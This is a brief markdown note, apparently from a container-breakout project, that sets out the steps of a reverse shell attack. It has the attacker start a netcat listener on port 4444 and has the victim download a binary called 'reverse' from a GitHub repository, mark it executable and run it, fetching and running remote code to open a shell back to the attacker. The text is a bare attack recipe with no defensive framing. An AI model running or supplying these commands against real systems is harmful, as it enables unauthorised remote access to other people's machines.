# Keypoint of reverse shell
  
    - on attacker host (same as host)
        - nc -nlvp 4444 (on attacker host)
  
    - on victim
        - wget https://github.com/boson13579/Container-breakout/raw/master/reverse 
        - chmod +x reverse
        - ./reverse

  